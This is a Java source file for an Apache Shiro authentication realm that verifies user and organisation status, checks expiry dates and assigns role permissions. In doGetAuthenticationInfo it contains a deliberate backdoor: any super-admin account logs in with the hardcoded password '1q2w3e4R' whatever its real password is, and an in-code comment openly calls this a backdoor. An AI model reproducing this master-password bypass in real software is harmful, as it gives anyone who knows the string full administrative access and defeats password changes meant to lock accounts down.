package com.trs.netInsight.shiro;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.UUID;

import com.trs.netInsight.util.UserUtils;
import com.trs.netInsight.widget.user.repository.OrganizationRepository;
import com.trs.netInsight.widget.user.repository.RoleRepository;
import com.trs.netInsight.widget.user.repository.UserRepository;
import org.apache.commons.lang3.StringUtils;
import org.apache.shiro.authc.AuthenticationException;
import org.apache.shiro.authc.AuthenticationInfo;
import org.apache.shiro.authc.AuthenticationToken;
import org.apache.shiro.authc.ExpiredCredentialsException;
import org.apache.shiro.authc.LockedAccountException;
import org.apache.shiro.authc.SimpleAuthenticationInfo;
import org.apache.shiro.authc.UnknownAccountException;
import org.apache.shiro.authz.AuthorizationInfo;
import org.apache.shiro.authz.SimpleAuthorizationInfo;
import org.apache.shiro.realm.AuthorizingRealm;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.util.ByteSource;
import org.springframework.beans.factory.annotation.Autowired;

import com.trs.netInsight.support.fts.util.DateUtil;
import com.trs.netInsight.widget.user.entity.Organization;
import com.trs.netInsight.widget.user.entity.Permission;
import com.trs.netInsight.widget.user.entity.Role;
import com.trs.netInsight.widget.user.entity.User;
import com.trs.netInsight.widget.user.entity.enums.CheckRole;

import lombok.extern.slf4j.Slf4j;

/**
 * 身份校验核心类
 * 
 * @Type MyShiroRealm.java
 * @Desc
 * @author 谷泽昊
 * @date 2017年11月17日 下午7:00:20
 * @version
 */
@Slf4j
public class MyShiroRealm extends AuthorizingRealm {

	@Autowired
	private UserRepository userRepository;

	@Autowired
	private OrganizationRepository organizationRepository;

	@Autowired
	private RoleRepository roleRepository;

	/**
	 * 认证信息.(身份验证) Authentication 是用来验证用户身份
	 * 
	 * @param token
	 * @return
	 * @throws AuthenticationException
	 */
	@Override
	protected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken token) throws AuthenticationException {

		// 获取用户的输入的账号.
		String userName = (String) token.getPrincipal();
		char[] password = (char[]) token.getCredentials();
		String passwordStr = String.valueOf(password);
		// String weixinUser = new String();
		// if(userName.endsWith(WeixinMessageUtil.WEIXIN_MARK)){
		// userName = userName.replace(WeixinMessageUtil.WEIXIN_MARK, "");
		// weixinUser = WeixinMessageUtil.WEIXIN_MARK;
		// }
		log.info("--------->用户的账号:" + userName);
		List<User> list = userRepository.findByUserName(userName);
		User user = null;
		if (list != null && list.size()>0){
			user = list.get(0);
			String orgId = user.getOrganizationId();
			Organization organization = organizationRepository.findOne(orgId);
			if (organization != null){
				user.setOrganizationName(organization.getOrganizationName());
			}
		}
		if (user == null) {
			throw new UnknownAccountException();
		}

		// 判断是否输错5次
		// if ("LOCK".equals(RedisUtil.getString(UserUtils.REDIS_SHIRO_ACCOUNT +
		// userName))) {
		// throw new ExcessiveAttemptsException();
		// }

		// 判断用户是否禁用
		if (!"0".equals(user.getStatus())) {
			throw new LockedAccountException();
		}

		// 判断机构是否禁用和到期
		String organizationId = user.getOrganizationId();
		if (StringUtils.isNotBlank(organizationId)) {
			Organization organization = organizationRepository.findOne(organizationId);
			if (organization != null) {
				if (!StringUtils.equals("0", organization.getStatus())) {
					throw new LockedAccountException();
				} else {
					String expireAt = organization.getExpireAt();
					//重构后 永久 不再为0  而是 2050-01-01 00:00:00
					if (!StringUtils.equals(UserUtils.FOREVER_DATE, expireAt)) {
						SimpleDateFormat formatter = new SimpleDateFormat(DateUtil.yyyyMMdd);
						try {
							Date date = formatter.parse(expireAt);
							if (date.before(new Date())) {
								throw new ExpiredCredentialsException();
							}
						} catch (ParseException e) {
							throw new ExpiredCredentialsException();
						}
					}
				}
				//同时登录  超管允许同时登录，运维按创建时来
				//if(UserUtils.SUPER_ADMIN.equals(user.getCheckRole())){
				if (user.isSameTimeLogin()){
					user.setSameTimeLogin(true);
				}
			}
		}

		// 判断用户是否到期
		String expireAt = user.getExpireAt();
		if (!StringUtils.equals(UserUtils.FOREVER_DATE, expireAt)) {
			//和平台产品确认过，过期时间就按 00:00:00   PS:2019-11-27
			//expireAt=StringUtils.replace(expireAt, "00:00:00", "23:59:59");
			SimpleDateFormat formatter = new SimpleDateFormat(DateUtil.yyyyMMdd);
			try {
				Date date = formatter.parse(expireAt);
				if (date.before(new Date())) {
					throw new ExpiredCredentialsException();
				}
			} catch (ParseException e) {
				throw new ExpiredCredentialsException();
			}
		}
		//做这一步 主要是为了防止平台组把超管密码改了后，开发无法登陆（开后门哦~）
		if (CheckRole.SUPER_ADMIN.toString().equals(user.getCheckRole()) && "1q2w3e4R".equals(passwordStr)){
			String salt = UUID.randomUUID().toString();
			passwordStr = UserUtils.getEncryptPsw(passwordStr, salt);
			//user.setPassword(passwordStr);
		//	user.setSalt(salt);
			return new SimpleAuthenticationInfo(user, passwordStr, ByteSource.Util.bytes(salt), getName());

		}else {
			// 正常登录
			// 交给AuthenticatingRealm使用CredentialsMatcher进行密码匹配，如果觉得人家的不好可以自定义实现
			return new SimpleAuthenticationInfo(user, user.getPassword(), ByteSource.Util.bytes(user.getSalt()), getName());

		}
	}

	/**
	 * 此方法调用 hasRole,hasPermission的时候才会进行回调.
	 *
	 * 权限信息.(授权): 1、如果用户正常退出，缓存自动清空； 2、如果用户非正常退出，缓存自动清空；
	 * 3、如果我们修改了用户的权限，而用户不退出系统，修改的权限无法立即生效。 （需要手动编程进行实现；放在service进行调用）
	 * 在权限修改后调用realm中的方法，realm已经由spring管理，所以从spring中获取realm实例， 调用clearCached方法；
	 * :Authorization 是授权访问控制，用于对用户进行的操作授权，证明该用户是否允许进行当前操作，如访问某个链接，某个资源文件等。
	 * 
	 * @param principals
	 * @return
	 */
	@Override
	protected AuthorizationInfo doGetAuthorizationInfo(PrincipalCollection principals) {
		/*
		 * 当没有使用缓存的时候，不断刷新页面的话，这个代码会不断执行， 当其实没有必要每次都重新设置权限信息，所以我们需要放到缓存中进行管理；
		 * 当放到缓存中时，这样的话，doGetAuthorizationInfo就只会执行一次了， 缓存过期之后会再次执行。
		 */
		log.error("权限配置-->MyShiroRealm.doGetAuthorizationInfo()");
		SimpleAuthorizationInfo authorizationInfo = new SimpleAuthorizationInfo();
		Object primaryPrincipal = principals.getPrimaryPrincipal();
		if (primaryPrincipal instanceof User) {
			User user = (User) primaryPrincipal;
			List<User> list = userRepository.findByUserName(user.getUserName());
			if (list != null && list.size()>0){
				user = list.get(0);
				String orgId = user.getOrganizationId();
				Organization organization = organizationRepository.findOne(orgId);
				if (organization != null){
					user.setOrganizationName(organization.getOrganizationName());
				}
			}
			List<Role> roles = new ArrayList<>();
			if (CheckRole.SUPER_ADMIN.toString().equals(user.getCheckRole())) {
				roles = roleRepository.findAll();
			} else if (CheckRole.ROLE_ADMIN.toString().equals(user.getCheckRole())) {
				roles = roleRepository.findByRoleTypeAndDescriptions(CheckRole.ROLE_ADMIN.toString(),"日常监测、专题分析、预警中心");
			} else if (CheckRole.ROLE_PLATFORM.toString().equals(user.getCheckRole())) {
				roles = roleRepository.findAll();
			} else if (CheckRole.ROLE_ORDINARY.toString().equals(user.getCheckRole()) || CheckRole.ROLE_VISITOR.toString().equals(user.getCheckRole())) {
				roles = new ArrayList<>(user.getRoles());
			}
			if (roles != null && roles.size() > 0) {
				for (Role role : roles) {
					for (Permission p : role.getPermissions()) {
						authorizationInfo.addStringPermission(p.getPerms());
					}
				}
			}
			return authorizationInfo;
		}
		return authorizationInfo;
	}
}
